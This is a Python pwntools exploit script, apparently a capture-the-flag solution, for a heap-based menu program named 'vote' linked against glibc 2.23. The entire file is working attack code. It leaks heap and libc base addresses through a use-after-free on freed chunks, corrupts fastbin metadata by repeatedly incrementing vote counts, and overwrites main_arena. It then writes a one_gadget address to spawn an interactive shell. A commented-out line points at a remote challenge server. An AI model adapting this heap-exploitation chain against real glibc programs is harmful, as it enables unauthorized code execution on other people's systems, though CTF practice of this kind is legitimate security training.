#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"

from pwn import *
import time

# Settings
context.terminal = ['tmux', 'splitw', '-h']

# Global

#io = remote("47.97.190.1", 6000)
#io = process("./vote", env = {"LD_PRELOAD" : "./libc-2.23.so"})
io = process("./vote")

# gdb
def attach(addr):
    gdb.attach(io, execute='b *0x%x' % (addr))

def create(size, name):
    io.recvuntil('Action:')
    io.sendline('0')
    io.recvuntil("Please enter the name's size:")
    io.sendline(str(size))
    io.recvuntil("Please enter the name")
    io.sendline(name)

def show(idx):
    io.recvuntil('Action:')
    io.sendline('1')
    io.recvuntil("Please enter the index:")
    io.sendline(str(idx))

def vote(idx):
    io.recvuntil('Action:')
    io.sendline('2')
    io.recvuntil("Please enter the index:")
    io.sendline(str(idx))

def result(idx):
    io.recvuntil('Action:')
    io.sendline('3')

def cancel(idx):
    io.recvuntil('Action:')
    io.sendline('4')
    io.recvuntil("Please enter the index:")
    io.sendline(str(idx))

create(0x80, '0'*0x80)
create(0x40, '1'*0x40)
create(0x80, '2'*0x80)
create(0x40, (p64(0x0)+p64(0x61)+p64(0x81)).ljust(0x40, '3'))
create(0x40, '4'*0x40)
create(0x40, '5'*0x40)
#create(0x40, '6'*0x40)

cancel(0)
cancel(2)


show(2)
io.recvuntil("count: ")
heap_base = int(io.recvline()[:-1])
io.recvuntil("time: ")
main_arena = int(io.recvline()[:-1])
libc_base = main_arena-0x3c4b78
log.info("heap_base : %#x" % heap_base)
log.info("main_arena : %#x" % main_arena)
log.info("libc_base : %#x" % libc_base)

cancel(3)
cancel(4)


for i in xrange(0x20):
    vote(4)


create(0x40, '7'*0x38)
create(0x40, '8'*0x38)

create(0x60, (p64(0x0)+p64(0x81)+p64(main_arena-0x38)).ljust(0x60, '9'))
create(0x60, 'a'*0x60)

cancel(8)
cancel(9)
for i in xrange(0x20):
    vote(9)

attach(0x401281)

create(0x60, '9'*0x60)
create(0x60, 'a'*0x60)

create(0x60, '\0'*0x18+p64(libc_base+0x3c5c50))

create(0x3c0, '\0'*0x200)
create(0x3c0, '\0'*0x200)
#attach(0x401281)
create(0x3c0, '\0'*0x378+p64(libc_base+0x4526a))
cancel(1)

io.interactive()
